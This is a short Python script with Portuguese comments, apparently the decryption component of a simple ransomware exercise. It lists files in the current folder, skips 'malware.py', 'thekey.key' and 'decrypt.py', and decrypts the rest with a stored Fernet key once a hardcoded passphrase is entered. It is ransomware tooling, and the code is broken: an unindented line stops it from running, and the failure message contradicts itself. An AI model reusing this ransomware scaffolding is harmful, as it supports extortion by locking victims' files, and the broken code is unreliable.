#indica que o interpretador Python 3 deve ser utilizado para executar o script
#!/usr/bin/env python3

#Importa o módulo os para interagir com o sistema operativo
import os

#Importa Fernet do módulo cryptography para criptografia de dados
from cryptography.fernet import Fernet

#Itera sobre os arquivos no diretório atual
files = []
for file in os.listdir():

#Verifica se o arquivo é "malware.py", "thekey.key" ou "decrypt.py e se for um desses arquivos, o loop continua para o próximo arquivo
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
	files.append(file)

print(files)


#Abrindo o arquivo e Lendo a chave
with open("thekey.key", "rb") as key:
		secretkey = key.read()

#Aqui consta  o código para desbloquear os ficheiros  assim como a mensagem de saida para o utilizador
passphrase = "Cy3erSec"
upassword =  input("Escreva o seu password para desbloquear  os seus ficheiros: ")
if upassword == passphrase:
	for file in files:
		with open(file, "rb") as thefile:
			content = thefile.read()
		content_decrypt =  Fernet(secretkey).decrypt(content)
		with open(file, "wb") as thefile:
			thefile.write(content_decrypt)
		print("Seus arquivos foram desbloqueados")
else: 
	print("Escreveu uma senha correcta para recuperar os seus arquivos")
